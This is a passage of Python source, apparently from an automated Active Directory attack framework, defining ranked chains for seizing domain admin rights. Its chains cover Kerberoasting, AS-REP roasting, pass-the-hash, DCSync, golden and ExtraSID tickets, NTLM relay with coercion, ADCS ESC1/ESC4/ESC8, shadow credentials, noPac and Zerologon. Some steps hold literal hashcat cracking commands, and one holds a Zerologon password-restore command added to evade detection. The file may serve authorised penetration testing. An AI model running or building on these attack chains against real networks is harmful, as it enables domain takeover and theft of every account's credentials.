"""
Situation-aware multi-path generator for Path-to-DA chains.

Given starting position + available credentials + optional graph data,
produces ranked attack paths covering all major AD exploitation scenarios.
"""
from __future__ import annotations

import logging
import os
import tempfile
from dataclasses import dataclass, field
from typing import Any

log = logging.getLogger(__name__)

# ─── Step template ──────────────────────────────────────────────────────────

@dataclass
class StepDef:
    technique_id: str
    label: str
    description: str
    mitre: str
    edge_type: str
    src_label: str
    tgt_label: str
    is_manual: bool = False
    manual_prompt: str = ""
    fallbacks: list[str] = field(default_factory=list)
    loot_produces: str | None = None
    loot_requires: str | None = None


# ─── Named attack paths ──────────────────────────────────────────────────────

@dataclass
class AttackPathDef:
    id: str
    name: str
    description: str
    confidence: float          # 0.0 – 1.0
    situations: list[str]      # which StartingPositions this path applies to
    steps: list[StepDef]
    tags: list[str] = field(default_factory=list)


# ─── Path library ────────────────────────────────────────────────────────────
# All major AD attack paths, covering every starting situation.

ALL_PATHS: list[AttackPathDef] = [

    # ── ANON / DOMAIN_USER ───────────────────────────────────────────────────

    AttackPathDef(
        id="asrep_crack_kerberoast_dcsync",
        name="AS-REP → Crack → Kerberoast → DCSync",
        description="Hunt pre-auth disabled users, roast, crack offline, then kerberoast service accounts and DCSync",
        confidence=0.82,
        situations=["ANON", "DOMAIN_USER"],
        tags=["kerberos", "no-creds", "classic"],
        steps=[
            StepDef(
                technique_id="asreproast",
                label="AS-REP Roast", mitre="T1558.004",
                description="Roast users with no pre-auth — no credentials required",
                edge_type="NO_PREAUTH", src_label="Attacker", tgt_label="Pre-auth Disabled Users",
                loot_produces="asrep_hashes", fallbacks=["getnpusers"],
            ),
            StepDef(
                technique_id="manual_crack", is_manual=True,
                label="Crack AS-REP Hashes", mitre="T1110.002",
                description="Offline crack with hashcat — hashcat -m 18200",
                edge_type="MANUAL", src_label="Captured Hashes", tgt_label="Cracked Password",
                loot_requires="asrep_hashes", loot_produces="cleartext_creds",
                manual_prompt=(
                    "hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt\n"
                    "Enter the cracked password to continue:"
                ),
            ),
            StepDef(
                technique_id="kerberoast",
                label="Kerberoast", mitre="T1558.003",
                description="Now with valid creds — roast all SPN-bearing accounts",
                edge_type="HAS_SPN", src_label="Cracked User", tgt_label="Service Accounts",
                loot_produces="kerberos_hashes", fallbacks=["getuserspns"],
            ),
            StepDef(
                technique_id="manual_crack", is_manual=True,
                label="Crack TGS Hashes", mitre="T1110.002",
                description="Offline crack kerberoast hashes — hashcat -m 13100",
                edge_type="MANUAL", src_label="TGS Hashes", tgt_label="Service Account Password",
                loot_requires="kerberos_hashes", loot_produces="cleartext_creds",
                manual_prompt=(
                    "hashcat -m 13100 kerberoast.txt /usr/share/wordlists/rockyou.txt\n"
                    "Enter the cracked password or enter 'pth' to use hash directly:"
                ),
            ),
            StepDef(
                technique_id="secretsdump",
                label="Secrets Dump", mitre="T1003.002",
                description="Use cracked SVC creds to dump secrets from an admin host",
                edge_type="ADMIN_TO", src_label="Cracked SVC Account", tgt_label="Domain Host",
                loot_produces="nt_hashes", fallbacks=["wmiexec", "smbexec"],
            ),
            StepDef(
                technique_id="dcsync",
                label="DCSync", mitre="T1003.006",
                description="Replicate all domain hashes — GAME OVER",
                edge_type="DCSYNC", src_label="Privileged Account", tgt_label="Domain Controller",
                loot_produces="da_hashes", fallbacks=["secretsdump"],
            ),
        ],
    ),

    AttackPathDef(
        id="kerberoast_pth_dcsync",
        name="Kerberoast → PTH → DCSync",
        description="Roast SPNs, crack, pass-the-hash to admin host, dump DC secrets",
        confidence=0.79,
        situations=["DOMAIN_USER"],
        tags=["kerberos", "pth", "lateral"],
        steps=[
            StepDef(
                technique_id="kerberoast",
                label="Kerberoast", mitre="T1558.003",
                description="Roast all service accounts with SPNs",
                edge_type="HAS_SPN", src_label="Domain User", tgt_label="Service Accounts",
                loot_produces="kerberos_hashes", fallbacks=["getuserspns"],
            ),
            StepDef(
                technique_id="manual_crack", is_manual=True,
                label="Crack TGS Hashes", mitre="T1110.002",
                description="hashcat -m 13100 kerberoast.txt rockyou.txt",
                edge_type="MANUAL", src_label="TGS Hashes", tgt_label="SVC Password",
                loot_requires="kerberos_hashes", loot_produces="cleartext_creds",
                manual_prompt="hashcat -m 13100 kerberoast.txt /usr/share/wordlists/rockyou.txt\nEnter cracked password:",
            ),
            StepDef(
                technique_id="wmiexec",
                label="WMI Lateral Move", mitre="T1047",
                description="Pass-the-Hash / creds → exec on admin host",
                edge_type="ADMIN_TO", src_label="Cracked SVC Account", tgt_label="Admin Host",
                loot_produces="command_output", fallbacks=["smbexec", "psexec"],
            ),
            StepDef(
                technique_id="secretsdump",
                label="Dump DC Secrets", mitre="T1003.002",
                description="Dump credentials from the Domain Controller",
                edge_type="DCSYNC", src_label="Admin Access", tgt_label="Domain Controller",
                loot_produces="da_hashes", fallbacks=["dcsync"],
            ),
        ],
    ),

    AttackPathDef(
        id="delegation_getst_dcsync",
        name="Constrained Delegation → Service Ticket → DCSync",
        description="Abuse constrained delegation to impersonate DA, then DCSync",
        confidence=0.88,
        situations=["DOMAIN_USER", "HASH_ONLY", "SVC_ACCT"],
        tags=["delegation", "kerberos", "high-confidence"],
        steps=[
            StepDef(
                technique_id="getst",
                label="Impersonation via Delegation", mitre="T1558.001",
                description="Abuse constrained/RBCD delegation — impersonate Administrator",
                edge_type="ALLOWED_TO_DELEGATE", src_label="SVC Account", tgt_label="Target Service",
                loot_produces="ccache_ticket", fallbacks=["getTGT"],
            ),
            StepDef(
                technique_id="secretsdump",
                label="Dump DC via Ticket", mitre="T1003.002",
                description="Use impersonation ticket to dump DC secrets",
                edge_type="ADMIN_TO", src_label="Impersonated DA", tgt_label="Domain Controller",
                loot_produces="da_hashes", fallbacks=["dcsync"],
            ),
            StepDef(
                technique_id="dcsync",
                label="DCSync", mitre="T1003.006",
                description="Full domain credential replication",
                edge_type="DCSYNC", src_label="DA Ticket", tgt_label="Domain Controller",
                loot_produces="da_hashes",
            ),
        ],
    ),

    AttackPathDef(
        id="pth_direct_dcsync",
        name="Pass-the-Hash → DCSync",
        description="PTH directly to exec + DCSync — fastest path when you have a hash",
        confidence=0.91,
        situations=["HASH_ONLY", "LOCAL_ADMIN"],
        tags=["pth", "direct", "fast"],
        steps=[
            StepDef(
                technique_id="wmiexec",
                label="PTH — WMI Exec", mitre="T1047",
                description="Pass-the-Hash to remote exec on target — verify admin access",
                edge_type="ADMIN_TO", src_label="NT Hash", tgt_label="Target Host",
                loot_produces="command_output", fallbacks=["smbexec", "psexec", "atexec"],
            ),
            StepDef(
                technique_id="secretsdump",
                label="Secrets Dump", mitre="T1003.002",
                description="Dump SAM + LSA + cached creds — look for DA or privileged hashes",
                edge_type="ADMIN_TO", src_label="Admin Access", tgt_label="Target Host",
                loot_produces="nt_hashes", fallbacks=["dcsync"],
            ),
            StepDef(
                technique_id="dcsync",
                label="DCSync", mitre="T1003.006",
                description="Use elevated hash to DCSync all domain credentials",
                edge_type="DCSYNC", src_label="Privileged Hash", tgt_label="Domain Controller",
                loot_produces="da_hashes",
            ),
        ],
    ),

    AttackPathDef(
        id="local_admin_cache_dcsync",
        name="Local Admin → Cached Creds → DCSync",
        description="Dump local secrets, find cached domain admin creds, PTH to DC",
        confidence=0.75,
        situations=["LOCAL_ADMIN"],
        tags=["local", "cached-creds", "lateral"],
        steps=[
            StepDef(
                technique_id="secretsdump",
                label="Dump Local Secrets", mitre="T1003.002",
                description="Dump SAM, LSA, and cached domain credentials from local machine",
                edge_type="LOCAL_ADMIN", src_label="Local Admin", tgt_label="Local Machine",
                loot_produces="nt_hashes", fallbacks=["wmiexec"],
            ),
            StepDef(
                technique_id="wmiexec",
                label="Lateral Move with Cached Creds", mitre="T1047",
                description="PTH with extracted hashes to reach admin hosts",
                edge_type="ADMIN_TO", src_label="Extracted Creds", tgt_label="Admin Host",
                loot_produces="command_output", fallbacks=["smbexec", "psexec"],
            ),
            StepDef(
                technique_id="secretsdump",
                label="Dump DC Secrets", mitre="T1003.002",
                description="Hit the DC with PTH — dump all domain hashes",
                edge_type="DCSYNC", src_label="Admin Access", tgt_label="Domain Controller",
                loot_produces="da_hashes", fallbacks=["dcsync"],
            ),
        ],
    ),

    AttackPathDef(
        id="acl_writedacl_dcsync",
        name="WriteDACL / GenericAll → Grant DCSync → DCSync",
        description="Abuse ACL rights to grant yourself DCSync permissions then replicate",
        confidence=0.85,
        situations=["DOMAIN_USER", "HASH_ONLY"],
        tags=["acl-abuse", "dcsync", "stealth"],
        steps=[
            StepDef(
                technique_id="wmiexec",
                label="Validate ACL Access", mitre="T1047",
                description="Confirm access and enumerate writable ACL targets via exec",
                edge_type="WRITE_DACL", src_label="Domain User", tgt_label="ACL Target",
                loot_produces="command_output", fallbacks=["smbexec"],
            ),
            StepDef(
                technique_id="dcsync",
                label="DCSync via Granted Rights", mitre="T1003.006",
                description="Use granted DCSync rights to replicate all domain hashes",
                edge_type="GET_CHANGES_ALL", src_label="DCSync Rights", tgt_label="Domain Controller",
                loot_produces="da_hashes",
            ),
        ],
    ),

    AttackPathDef(
        id="samrdump_asrep_crack_dcsync",
        name="Null Session → Enum → AS-REP → Crack → DCSync",
        description="Full unauthenticated path: enumerate users, AS-REP roast, crack, escalate",
        confidence=0.65,
        situations=["ANON"],
        tags=["no-creds", "null-session", "full-chain"],
        steps=[
            StepDef(
                technique_id="lookupsid",
                label="SID Enumeration", mitre="T1087.002",
                description="Enumerate domain users and groups via null session",
                edge_type="MEMBER_OF", src_label="Null Session", tgt_label="Domain Users",
                loot_produces="user_list", fallbacks=["samrdump"],
            ),
            StepDef(
                technique_id="asreproast",
                label="AS-REP Roast", mitre="T1558.004",
                description="Roast users with pre-auth disabled from enumerated list",
                edge_type="NO_PREAUTH", src_label="User List", tgt_label="Pre-auth Disabled Users",
                loot_produces="asrep_hashes", fallbacks=["getnpusers"],
            ),
            StepDef(
                technique_id="manual_crack", is_manual=True,
                label="Crack AS-REP Hashes", mitre="T1110.002",
                description="hashcat -m 18200 asrep.txt rockyou.txt",
                edge_type="MANUAL", src_label="AS-REP Hashes", tgt_label="Domain Creds",
                loot_requires="asrep_hashes", loot_produces="cleartext_creds",
                manual_prompt="hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt\nEnter cracked password:",
            ),
            StepDef(
                technique_id="secretsdump",
                label="Dump Admin Host", mitre="T1003.002",
                description="Use cracked creds to dump an admin machine's secrets",
                edge_type="ADMIN_TO", src_label="Cracked Account", tgt_label="Admin Host",
                loot_produces="nt_hashes", fallbacks=["wmiexec"],
            ),
            StepDef(
                technique_id="dcsync",
                label="DCSync", mitre="T1003.006",
                description="Full domain credential replication",
                edge_type="DCSYNC", src_label="Privileged Hash", tgt_label="Domain Controller",
                loot_produces="da_hashes",
            ),
        ],
    ),

    AttackPathDef(
        id="golden_ticket",
        name="krbtgt Hash → Golden Ticket → Domain Dominance",
        description="Forge a Golden Ticket from krbtgt hash — unlimited persistence",
        confidence=0.97,
        situations=["DOMAIN_USER", "HASH_ONLY"],
        tags=["golden-ticket", "persistence", "krbtgt"],
        steps=[
            StepDef(
                technique_id="dcsync",
                label="DCSync — dump krbtgt", mitre="T1003.006",
                description="Replicate krbtgt hash specifically",
                edge_type="DCSYNC", src_label="DCSync Rights", tgt_label="Domain Controller",
                loot_produces="da_hashes",
            ),
            StepDef(
                technique_id="ticketer",
                label="Golden Ticket Forge", mitre="T1558.001",
                description="Forge a Golden Ticket valid for any user — permanent domain access",
                edge_type="DCSYNC", src_label="krbtgt Hash", tgt_label="Any Principal",
                loot_requires="krbtgt_hash", loot_produces="golden_ticket",
            ),
            StepDef(
                technique_id="wmiexec",
                label="Use Golden Ticket", mitre="T1047",
                description="Use forged ticket to access DC as Administrator",
                edge_type="ADMIN_TO", src_label="Golden Ticket", tgt_label="Domain Controller",
                loot_produces="command_output",
            ),
        ],
    ),

    AttackPathDef(
        id="svc_acct_delegation",
        name="Service Account → Constrained Delegation → DA",
        description="Leverage constrained delegation from service account to impersonate DA",
        confidence=0.90,
        situations=["SVC_ACCT", "DOMAIN_USER"],
        tags=["delegation", "kerberos", "service-account"],
        steps=[
            StepDef(
                technique_id="getTGT",
                label="Obtain TGT", mitre="T1558.003",
                description="Get a TGT for the service account with delegation rights",
                edge_type="MEMBER_OF", src_label="SVC Account Creds", tgt_label="KDC",
                loot_produces="ccache_ticket",
            ),
            StepDef(
                technique_id="getst",
                label="Impersonate DA via getST", mitre="T1558.001",
                description="Request service ticket impersonating Administrator on DC",
                edge_type="ALLOWED_TO_DELEGATE", src_label="SVC TGT", tgt_label="Domain Controller",
                loot_produces="ccache_ticket", fallbacks=["dcsync"],
            ),
            StepDef(
                technique_id="secretsdump",
                label="Dump DC with DA Ticket", mitre="T1003.002",
                description="Use the forged service ticket to dump DC credentials",
                edge_type="DCSYNC", src_label="DA Ticket", tgt_label="Domain Controller",
                loot_produces="da_hashes",
            ),
        ],
    ),

    AttackPathDef(
        id="ntlm_relay_ldap_dcsync",
        name="NTLM Relay → LDAP → DCSync",
        description="Coerce auth via PrinterBug/PetitPotam, relay to LDAP(S), grant DCSync rights, replicate all hashes",
        confidence=0.86,
        situations=["ANON", "DOMAIN_USER"],
        tags=["relay", "coercion", "no-creds", "ntlm"],
        steps=[
            StepDef(
                technique_id="coerce",
                label="Coerce NTLM Auth", mitre="T1187",
                description="Trigger NTLM auth from DC via PrinterBug (MS-RPRN) or PetitPotam (MS-EFSRPC)",
                edge_type="COERCION", src_label="Attacker", tgt_label="Domain Controller",
                loot_produces="ntlm_challenge", fallbacks=["petitpotam"],
            ),
            StepDef(
                technique_id="ntlmrelayx",
                label="Relay to LDAP — Grant DCSync", mitre="T1557.001",
                description="Relay captured NTLM to LDAP, add DCSync rights (DS-Replication-Get-Changes-All) to attacker account",
                edge_type="NTLM_RELAY", src_label="NTLM Challenge", tgt_label="LDAP Server",
                loot_produces="dcsync_rights", fallbacks=["ldap_relay"],
            ),
            StepDef(
                technique_id="secretsdump",
                label="DCSync — Dump All Hashes", mitre="T1003.006",
                description="Use granted DCSync rights to replicate all domain password hashes",
                edge_type="DCSYNC", src_label="DCSync Rights", tgt_label="Domain Controller",
                loot_produces="da_hashes",
            ),
        ],
    ),

    AttackPathDef(
        id="adcs_esc1_cert_da",
        name="ADCS ESC1 → Certificate → DA Auth",
        description="Enroll vulnerable cert template as DA SAN, use cert to authenticate as Domain Admin (PKINIT/Schannel)",
        confidence=0.89,
        situations=["DOMAIN_USER"],
        tags=["adcs", "esc1", "certificate", "pkinit"],
        steps=[
            StepDef(
                technique_id="certipy_find",
                label="Find Vulnerable Templates (ESC1)", mitre="T1649",
                description="Enumerate ADCS templates where enrollee supplies subject + no manager approval + low-priv enrollment",
                edge_type="CAN_ENROLL", src_label="Domain User", tgt_label="CA / Templates",
                loot_produces="vulnerable_template", fallbacks=["certify_find"],
            ),
            StepDef(
                technique_id="certipy_req",
                label="Enroll as Domain Admin (ESC1)", mitre="T1649",
                description="Request cert with SAN=Administrator@domain via vulnerable template — no approval required",
                edge_type="ADCS_ESC1", src_label="Domain User", tgt_label="Certificate Authority",
                loot_produces="da_certificate", fallbacks=["certify_req"],
            ),
            StepDef(
                technique_id="certipy_auth",
                label="PKINIT Auth with DA Cert", mitre="T1649",
                description="Authenticate as Administrator using forged certificate — retrieve NT hash via PKINIT",
                edge_type="PASS_THE_CERT", src_label="DA Certificate", tgt_label="KDC",
                loot_produces="da_hashes", fallbacks=["pkiinit"],
            ),
            StepDef(
                technique_id="secretsdump",
                label="DCSync with DA Hash", mitre="T1003.006",
                description="Use Administrator NT hash to DCSync all domain credentials",
                edge_type="DCSYNC", src_label="DA Hash", tgt_label="Domain Controller",
                loot_produces="da_hashes",
            ),
        ],
    ),

    AttackPathDef(
        id="adcs_esc8_relay_cert",
        name="ADCS ESC8 → NTLM Relay to CA → Forge Cert → DA",
        description="Coerce DC auth, relay to AD CS HTTP enrollment, obtain DC cert, then DCSync via pass-the-cert",
        confidence=0.84,
        situations=["DOMAIN_USER", "ANON"],
        tags=["adcs", "esc8", "relay", "coercion", "ntlm"],
        steps=[
            StepDef(
                technique_id="coerce",
                label="Coerce DC NTLM Auth", mitre="T1187",
                description="Force DC to authenticate to attacker via PrinterBug or PetitPotam",
                edge_type="COERCION", src_label="Attacker", tgt_label="Domain Controller",
                loot_produces="ntlm_challenge",
            ),
            StepDef(
                technique_id="ntlmrelayx_adcs",
                label="Relay DC Auth to ADCS HTTP (ESC8)", mitre="T1557.001",
                description="Relay DC machine account auth to AD CS web enrollment endpoint — obtain DC certificate",
                edge_type="ADCS_ESC8", src_label="DC NTLM", tgt_label="Certificate Authority HTTP",
                loot_produces="dc_certificate", fallbacks=["certipy_relay"],
            ),
            StepDef(
                technique_id="secretsdump",
                label="DCSync via DC Cert", mitre="T1003.006",
                description="Use DC certificate for pass-the-cert / U2U attack to dump all domain hashes",
                edge_type="PASS_THE_CERT", src_label="DC Certificate", tgt_label="Domain Controller",
                loot_produces="da_hashes",
            ),
        ],
    ),

    AttackPathDef(
        id="shadow_credentials_pkinit",
        name="Shadow Credentials → PKINIT → NT Hash",
        description="Write msDS-KeyCredentialLink to a privileged account, authenticate via PKINIT to recover NT hash",
        confidence=0.87,
        situations=["DOMAIN_USER"],
        tags=["shadow-credentials", "pkinit", "acl-abuse"],
        steps=[
            StepDef(
                technique_id="whisker",
                label="Add Key Credential (Shadow Cred)", mitre="T1558.004",
                description="Abuse write access on msDS-KeyCredentialLink to add attacker-controlled cert credential to target account",
                edge_type="ADD_KEY_CREDENTIAL_LINK", src_label="Writable Account", tgt_label="Privileged Account",
                loot_produces="shadow_cert", fallbacks=["certipy_shadow"],
            ),
            StepDef(
                technique_id="certipy_auth",
                label="PKINIT Auth → Recover NT Hash", mitre="T1649",
                description="Authenticate as target account using shadow credential cert — PKINIT returns U2U TGT from which NT hash can be extracted",
                edge_type="PASS_THE_CERT", src_label="Shadow Credential", tgt_label="KDC",
                loot_produces="nt_hashes", fallbacks=["pkiinit"],
            ),
            StepDef(
                technique_id="wmiexec",
                label="PTH to Admin Host", mitre="T1047",
                description="Pass-the-Hash with recovered NT hash to reach admin hosts",
                edge_type="ADMIN_TO", src_label="NT Hash", tgt_label="Admin Host",
                loot_produces="command_output", fallbacks=["smbexec"],
            ),
            StepDef(
                technique_id="dcsync",
                label="DCSync", mitre="T1003.006",
                description="If account has DCSync rights (or is DA), replicate all domain hashes",
                edge_type="DCSYNC", src_label="Privileged Hash", tgt_label="Domain Controller",
                loot_produces="da_hashes",
            ),
        ],
    ),

    AttackPathDef(
        id="nopac_samaccountname_spoof",
        name="noPac — sAMAccountName Spoofing → DA TGT",
        description="Create machine account, rename to DC sAMAccountName, request TGT as DC, DCSync",
        confidence=0.78,
        situations=["DOMAIN_USER"],
        tags=["nopac", "cve-2021-42278", "cve-2021-42287", "machine-account"],
        steps=[
            StepDef(
                technique_id="addcomputer",
                label="Create Machine Account", mitre="T1136.002",
                description="Create a domain machine account (MachineAccountQuota must be >0 — default is 10)",
                edge_type="MACHINE_ACCOUNT", src_label="Domain User", tgt_label="New Machine Account",
                loot_produces="machine_creds", fallbacks=["impacket_addcomputer"],
            ),
            StepDef(
                technique_id="renamemachine",
                label="Rename to DC sAMAccountName", mitre="T1098",
                description="Set machine account sAMAccountName to match a DC (without trailing $) — CVE-2021-42278",
                edge_type="MACHINE_ACCOUNT", src_label="Machine Account", tgt_label="Spoofed DC Identity",
                loot_produces="machine_creds",
            ),
            StepDef(
                technique_id="getTGT",
                label="Request TGT as Spoofed DC", mitre="T1558.001",
                description="Request TGT for the renamed machine account — KDC issues DC-level ticket — CVE-2021-42287",
                edge_type="MEMBER_OF", src_label="Spoofed DC Account", tgt_label="KDC",
                loot_produces="ccache_ticket",
            ),
            StepDef(
                technique_id="secretsdump",
                label="DCSync with DC TGT", mitre="T1003.006",
                description="Use DC-level TGT to dump all domain hashes via DCSync",
                edge_type="DCSYNC", src_label="DC TGT", tgt_label="Domain Controller",
                loot_produces="da_hashes",
            ),
        ],
    ),

    AttackPathDef(
        id="trust_escalation_extrasid",
        name="Child Domain Admin → ExtraSID → Parent Forest DA",
        description="From child domain DA, forge inter-realm Golden Ticket with EA/DA SID of parent forest",
        confidence=0.93,
        situations=["DOMAIN_USER", "HASH_ONLY"],
        tags=["trust-escalation", "extrasid", "golden-ticket", "forest"],
        steps=[
            StepDef(
                technique_id="dcsync",
                label="DCSync Child Domain (krbtgt)", mitre="T1003.006",
                description="Dump krbtgt hash of child domain — required to forge inter-realm ticket",
                edge_type="DCSYNC", src_label="Child DA", tgt_label="Child DC",
                loot_produces="da_hashes",
            ),
            StepDef(
                technique_id="lookupsid",
                label="Enumerate Parent Forest SID", mitre="T1087.002",
                description="Get the Enterprise Admins SID (S-1-5-21-<parent>-519) from parent domain",
                edge_type="TRUSTS", src_label="Child Domain", tgt_label="Parent Forest",
                loot_produces="user_list",
            ),
            StepDef(
                technique_id="ticketer",
                label="Forge ExtraSID Golden Ticket", mitre="T1558.001",
                description="Forge Golden Ticket for child domain with extra SID = parent Enterprise Admins",
                edge_type="EXTRASID", src_label="Child krbtgt Hash", tgt_label="Parent Forest EA",
                loot_produces="golden_ticket", loot_requires="da_hashes",
            ),
            StepDef(
                technique_id="secretsdump",
                label="DCSync Parent Forest DC", mitre="T1003.006",
                description="Use forged inter-realm ticket to DCSync parent domain controller",
                edge_type="DCSYNC", src_label="EA Ticket", tgt_label="Parent Domain Controller",
                loot_produces="da_hashes",
            ),
        ],
    ),

    AttackPathDef(
        id="gmsa_read_pth_da",
        name="gMSA Password Read → PTH → DA",
        description="Read gMSA managed password blob, extract NT hash, PTH to admin host, DCSync",
        confidence=0.82,
        situations=["DOMAIN_USER"],
        tags=["gmsa", "pth", "managed-service-account"],
        steps=[
            StepDef(
                technique_id="gmsa_dump",
                label="Read gMSA Password", mitre="T1552.006",
                description="Read msDS-ManagedPassword attribute on gMSA account — requires PrincipalsAllowedToRetrieveManagedPassword membership",
                edge_type="READ_GMSA_PASSWORD", src_label="Authorized Account", tgt_label="gMSA Account",
                loot_produces="nt_hashes", fallbacks=["bloodyad"],
            ),
            StepDef(
                technique_id="wmiexec",
                label="PTH with gMSA Hash", mitre="T1047",
                description="Pass-the-Hash using gMSA NT hash to access admin hosts or DC",
                edge_type="ADMIN_TO", src_label="gMSA Hash", tgt_label="Target Host",
                loot_produces="command_output", fallbacks=["smbexec", "psexec"],
            ),
            StepDef(
                technique_id="dcsync",
                label="DCSync", mitre="T1003.006",
                description="If gMSA has DCSync rights or is DA-equivalent, replicate all hashes",
                edge_type="DCSYNC", src_label="Elevated Access", tgt_label="Domain Controller",
                loot_produces="da_hashes",
            ),
        ],
    ),

    AttackPathDef(
        id="rbcd_coercion_impersonation",
        name="Coercion → RBCD → S4U → DA Impersonation",
        description="Create machine account, coerce DC auth to write RBCD on it, S4U2Self+S4U2Proxy to impersonate DA on DC",
        confidence=0.85,
        situations=["DOMAIN_USER"],
        tags=["rbcd", "coercion", "s4u2proxy", "machine-account"],
        steps=[
            StepDef(
                technique_id="addcomputer",
                label="Create Attacker Machine Account", mitre="T1136.002",
                description="Create a machine account to use as RBCD delegation target",
                edge_type="MACHINE_ACCOUNT", src_label="Domain User", tgt_label="Attacker Machine Account",
                loot_produces="machine_creds",
            ),
            StepDef(
                technique_id="rbcd_write",
                label="Write RBCD on Target (via coercion relay)", mitre="T1557.001",
                description="Coerce target host auth, relay to LDAP, write msDS-AllowedToActOnBehalfOfOtherIdentity pointing to attacker machine",
                edge_type="ALLOWED_TO_ACT", src_label="Attacker Machine Account", tgt_label="Target Host",
                loot_produces="rbcd_rights",
            ),
            StepDef(
                technique_id="getst",
                label="S4U2Self + S4U2Proxy → DA Ticket", mitre="T1558.001",
                description="Use S4U2Self to get a service ticket as Administrator, then S4U2Proxy to get a ticket for cifs/target as DA",
                edge_type="ALLOWED_TO_ACT", src_label="RBCD Attacker Machine", tgt_label="Target Host CIFS",
                loot_produces="ccache_ticket",
            ),
            StepDef(
                technique_id="secretsdump",
                label="Dump Secrets via Impersonation Ticket", mitre="T1003.002",
                description="Use DA impersonation ticket to dump secrets from target host",
                edge_type="ADMIN_TO", src_label="DA Ticket", tgt_label="Target Host",
                loot_produces="da_hashes",
            ),
        ],
    ),

    AttackPathDef(
        id="sccm_naa_creds",
        name="SCCM / ConfigMgr NAA Credential Extraction → DA",
        description="Extract Network Access Account credentials from SCCM policy, PTH to DA",
        confidence=0.72,
        situations=["DOMAIN_USER", "LOCAL_ADMIN"],
        tags=["sccm", "configmgr", "naa", "credential-access"],
        steps=[
            StepDef(
                technique_id="sccm_enum",
                label="Enumerate SCCM Hierarchy", mitre="T1087.002",
                description="Identify SCCM site server and management points via LDAP/DNS",
                edge_type="MEMBER_OF", src_label="Domain User", tgt_label="SCCM Infrastructure",
                loot_produces="user_list", fallbacks=["sharphound"],
            ),
            StepDef(
                technique_id="sccm_naa",
                label="Extract NAA Credentials", mitre="T1552",
                description="Retrieve Network Access Account credentials from SCCM policy — often a highly privileged domain account",
                edge_type="LOCAL_ADMIN", src_label="SCCM Client", tgt_label="NAA Policy",
                loot_produces="cleartext_creds", fallbacks=["sharpwmi"],
            ),
            StepDef(
                technique_id="secretsdump",
                label="PTH/Creds to DA Host", mitre="T1003.002",
                description="Use extracted NAA credentials to access admin hosts and dump DA hashes",
                edge_type="ADMIN_TO", src_label="NAA Creds", tgt_label="Admin Host",
                loot_produces="nt_hashes",
            ),
            StepDef(
                technique_id="dcsync",
                label="DCSync", mitre="T1003.006",
                description="Full domain credential replication if NAA account has elevated rights",
                edge_type="DCSYNC", src_label="Elevated Creds", tgt_label="Domain Controller",
                loot_produces="da_hashes",
            ),
        ],
    ),

    AttackPathDef(
        id="printerbug_petitpotam_coerce_relay",
        name="PrinterBug + PetitPotam → Coerce → Relay → DA",
        description="Multi-coercion chain: attempt both MS-RPRN and MS-EFSRPC coercion, relay whichever succeeds to LDAP or ADCS",
        confidence=0.80,
        situations=["ANON", "DOMAIN_USER"],
        tags=["coercion", "printerbug", "petitpotam", "relay", "ms-rprn", "ms-efsrpc"],
        steps=[
            StepDef(
                technique_id="coerce",
                label="Multi-Coerce (PrinterBug + PetitPotam)", mitre="T1187",
                description="Try MS-RPRN SpoolSS (PrinterBug) then MS-EFSRPC (PetitPotam) to force DC NTLM auth to attacker host",
                edge_type="COERCION", src_label="Attacker", tgt_label="Domain Controller",
                loot_produces="ntlm_challenge", fallbacks=["dfscoerce", "shadowcoerce"],
            ),
            StepDef(
                technique_id="ntlmrelayx",
                label="Relay to LDAPS — Add DCSync", mitre="T1557.001",
                description="Relay to LDAPS (requires removing LDAP signing if needed) — grant attacker DCSync rights via ACL modification",
                edge_type="NTLM_RELAY", src_label="DC NTLM", tgt_label="LDAPS",
                loot_produces="dcsync_rights", fallbacks=["ntlmrelayx_adcs"],
            ),
            StepDef(
                technique_id="dcsync",
                label="DCSync All Hashes", mitre="T1003.006",
                description="Replicate entire NTDS.dit via granted DCSync rights",
                edge_type="DCSYNC", src_label="DCSync Rights", tgt_label="Domain Controller",
                loot_produces="da_hashes",
            ),
        ],
    ),

    AttackPathDef(
        id="zerologon_cve_2020_1472",
        name="Zerologon (CVE-2020-1472) → Null DC Creds → DCSync",
        description="Exploit MS-NRPC authentication bypass to set DC machine account password to null, then DCSync the entire domain",
        confidence=0.95,
        situations=["ANON", "DOMAIN_USER"],
        tags=["cve", "zerologon", "ms-nrpc", "no-creds", "critical"],
        steps=[
            StepDef(
                technique_id="zerologon",
                label="Zerologon — Reset DC Machine Account Password", mitre="T1210",
                description="Send crafted MS-NRPC Netlogon requests to exploit CVE-2020-1472, setting the DC machine account NT hash to empty (all-zeros)",
                edge_type="COERCION", src_label="Attacker (Network Access)", tgt_label="Domain Controller",
                loot_produces="nulled_dc_hash",
            ),
            StepDef(
                technique_id="secretsdump",
                label="Dump Domain Secrets via Null DC Hash", mitre="T1003.002",
                description="Use secretsdump with the null machine account password to dump NTDS.dit remotely — no credentials required beyond network access",
                edge_type="DCSYNC", src_label="Null DC Hash", tgt_label="Domain Controller NTDS",
                loot_produces="da_hashes",
            ),
            StepDef(
                technique_id="zerologon_restore",
                label="Restore DC Machine Account Password (Cleanup)", mitre="T1070",
                description="Restore the DC machine account password using the original hash obtained during dump to avoid DC desync and detection",
                edge_type="ADMIN_TO", src_label="Attacker", tgt_label="Domain Controller",
                is_manual=True,
                manual_prompt="Run: python3 restorepassword.py <DOMAIN>/<DC_HOSTNAME>@<DC_IP> -target-ip <DC_IP> -hexpass <ORIGINAL_HASH>",
                loot_produces=None,
            ),
        ],
    ),

    AttackPathDef(
        id="adcs_esc4_template_write",
        name="ADCS ESC4 — Template Write → Self-Enrollment DA Cert → DCSync",
        description="Abuse write permissions on a certificate template to add SAN capability, enroll as DA, authenticate with cert via PKINIT",
        confidence=0.88,
        situations=["DOMAIN_USER"],
        tags=["adcs", "esc4", "certificate", "template-misconfiguration"],
        steps=[
            StepDef(
                technique_id="certipy_find",
                label="Find Vulnerable ADCS Templates (ESC4)", mitre="T1649",
                description="Enumerate certificate templates with write permissions (WriteOwner/WriteDacl/WriteProperty) accessible to low-priv domain users",
                edge_type="MEMBER_OF", src_label="Domain User", tgt_label="CA Templates",
                loot_produces="vuln_template_name",
            ),
            StepDef(
                technique_id="certipy_template",
                label="Modify Template — Enable SAN + All Enroll", mitre="T1649",
                description="Write ENROLLEE_SUPPLIES_SUBJECT flag to template, set msPKI-Certificate-Name-Flag and remove approval requirements",
                edge_type="WRITE_DACL", src_label="Domain User (write perms)", tgt_label="Certificate Template",
                loot_produces="modified_template",
            ),
            StepDef(
                technique_id="certipy_req",
